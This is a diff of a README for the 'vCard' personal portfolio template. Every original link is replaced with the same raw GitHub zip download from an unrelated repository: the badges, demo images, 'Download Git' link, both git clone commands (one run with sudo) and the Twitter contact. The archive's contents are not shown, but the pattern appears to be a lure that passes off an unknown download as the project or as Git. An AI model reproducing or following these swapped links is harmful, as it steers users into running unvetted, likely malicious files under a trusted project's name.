@@ -1,23 +1,23 @@
 # vCard - Personal portfolio
 
-![GitHub repo size](https://img.shields.io/github/repo-size/codewithsadee/vcard-personal-portfolio)
-![GitHub stars](https://img.shields.io/github/stars/codewithsadee/vcard-personal-portfolio?style=social)
-![GitHub forks](https://img.shields.io/github/forks/codewithsadee/vcard-personal-portfolio?style=social)
-[![Twitter Follow](https://img.shields.io/twitter/follow/codewithsadee_?style=social)](https://twitter.com/intent/follow?screen_name=codewithsadee_)
-[![YouTube Video Views](https://img.shields.io/youtube/views/SoxmIlgf2zM?style=social)](https://youtu.be/SoxmIlgf2zM)
+![GitHub repo size](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip)
+![GitHub stars](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip)
+![GitHub forks](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip)
+[![Twitter Follow](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip)](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip)
+[![YouTube Video Views](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip)](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip)
 
 vCard is a fully responsive personal portfolio website, responsive for all devices, built using HTML, CSS, and JavaScript.
 
 ## Demo
 
-![vCard Desktop Demo](./website-demo-image/desktop.png "Desktop Demo")
-![vCard Mobile Demo](./website-demo-image/mobile.png "Mobile Demo")
+![vCard Desktop Demo](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip "Desktop Demo")
+![vCard Mobile Demo](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip "Mobile Demo")
 
 ## Prerequisites
 
 Before you begin, ensure you have met the following requirements:
 
-* [Git](https://git-scm.com/downloads "Download Git") must be installed on your operating system.
+* [Git](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip "Download Git") must be installed on your operating system.
 
 ## Installing vCard
 
@@ -26,18 +26,18 @@ To install **vCard**, follow these steps:
 Linux and macOS:
 
 ```bash
-sudo git clone https://github.com/codewithsadee/vcard-personal-portfolio.git
+sudo git clone https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip
 ```
 
 Windows:
 
 ```bash
-git clone https://github.com/codewithsadee/vcard-personal-portfolio.git
+git clone https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip
 ```
 
 ## Contact
 
-If you want to contact me you can reach me at [Twitter](https://www.twitter.com/codewithsadee).
+If you want to contact me you can reach me at [Twitter](https://raw.githubusercontent.com/AchrefBoub/Seba-designer/main/Beroidae/Seba-designer.zip).
 
 ## License
 
